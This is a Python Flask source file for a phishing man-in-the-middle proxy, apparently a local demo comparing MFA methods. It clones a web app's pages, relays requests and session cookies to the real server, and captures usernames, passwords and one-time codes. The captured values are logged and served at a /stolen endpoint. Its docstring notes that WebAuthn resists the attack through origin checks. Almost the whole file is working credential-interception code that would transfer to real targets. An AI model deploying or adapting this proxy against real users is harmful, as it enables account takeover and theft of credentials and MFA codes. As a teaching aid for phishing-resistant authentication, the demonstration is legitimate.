"""
mitm.py — a tiny phishing/MITM proxy that:
 - Serves the same UI (home/signup/account) on :5001
 - Proxies API calls to the real app on :5000
 - Captures username/password/OTP for demonstration
 - Carefully preserves the REAL server session cookie to keep WebAuthn state
   (but WebAuthn will still FAIL due to strict origin check on the real server)
"""

from flask import Flask, request, render_template, jsonify, Response, session as flask_session
import requests
from urllib.parse import urljoin
import re

app = Flask(__name__, static_folder="static", template_folder="templates")
app.config['SECRET_KEY'] = 'mitm-proxy-session-secret'

REAL_ORIGIN = "http://localhost:5000"
STOLEN = {
    "passwords": [],  # {username, password}
    "otps": []        # {username, code}
}

# Helper to keep real server's session cookie per client
def get_real_cookies():
    cookie = flask_session.get("real_session_cookie")
    return {"session": cookie} if cookie else {}

def store_real_session_cookie(resp):
    # Pull 'session=...' from Set-Cookie
    set_cookie = resp.headers.get("Set-Cookie", "")
    m = re.search(r"session=([^;]+);", set_cookie)
    if m:
        flask_session["real_session_cookie"] = m.group(1)

def strip_hop_by_hop(hdrs: dict):
    # Remove headers that shouldn't be forwarded back
    hop = {"content-encoding", "transfer-encoding", "connection", "keep-alive", "proxy-authenticate",
           "proxy-authorization", "te", "trailers", "upgrade"}
    return [(k, v) for k, v in hdrs.items() if k.lower() not in hop]

def forward_json(path: str, json_body: dict):
    url = urljoin(REAL_ORIGIN, path)
    cookies = get_real_cookies()
    r = requests.post(url, json=json_body, cookies=cookies, allow_redirects=False)
    store_real_session_cookie(r)
    return Response(r.content, status=r.status_code, headers=strip_hop_by_hop(r.headers))

def forward_raw(path: str):
    url = urljoin(REAL_ORIGIN, path)
    cookies = get_real_cookies()
    r = requests.request(
        method=request.method,
        url=url,
        headers={k: v for k, v in request.headers if k.lower() != "host"},
        data=request.get_data(),
        cookies=cookies,
        allow_redirects=False,
    )
    store_real_session_cookie(r)
    return Response(r.content, status=r.status_code, headers=strip_hop_by_hop(r.headers))

# -------- UI (serve same templates) --------
@app.route("/")
@app.route("/home")
def home():
    return render_template("home.html")

@app.route("/signup")
def signup():
    return render_template("signup.html")

@app.route("/account")
def account():
    return render_template("account.html")

# -------- Proxy endpoints (and steal creds) --------
@app.route("/register", methods=["POST"])
def mitm_register():
    return forward_raw("/register")

@app.route("/login", methods=["POST"])
def mitm_login():
    data = request.get_json(force=True, silent=True) or {}
    if "username" in data and "password" in data:
        STOLEN["passwords"].append({"username": data["username"], "password": data["password"]})
        print(f"[MITM] Stole credentials: {data['username']} / {data['password']}")
    return forward_json("/login", data)

@app.route("/mfa/enroll", methods=["POST"])
def mitm_enroll():
    return forward_raw("/mfa/enroll")

@app.route("/mfa/verify", methods=["POST"])
def mitm_verify():
    data = request.get_json(force=True, silent=True) or {}
    if "username" in data and "code" in data:
        STOLEN["otps"].append({"username": data["username"], "code": data["code"]})
        print(f"[MITM] Stole OTP for {data['username']}: {data['code']}")
    return forward_json("/mfa/verify", data)

# WebAuthn: begin/complete are proxied; server origin check will reject on complete.
@app.route("/webauthn/login/begin", methods=["POST"])
def mitm_webauthn_begin():
    return forward_raw("/webauthn/login/begin")

@app.route("/webauthn/login/complete", methods=["POST"])
def mitm_webauthn_complete():
    return forward_raw("/webauthn/login/complete")

@app.route("/webauthn/register/begin", methods=["POST"])
def mitm_webauthn_reg_begin():
    return forward_raw("/webauthn/register/begin")

@app.route("/webauthn/register/complete", methods=["POST"])
def mitm_webauthn_reg_complete():
    return forward_raw("/webauthn/register/complete")

@app.route("/message", methods=["POST"])
def mitm_message():
    return forward_raw("/message")

# -------- Demo helper: view stolen data --------
@app.route("/stolen")
def stolen():
    return jsonify(STOLEN), 200

if __name__ == "__main__":
    print(f"Starting MITM proxy on http://localhost:5001 (forwarding to {REAL_ORIGIN})")
    app.run(host="0.0.0.0", port=5001, debug=False)
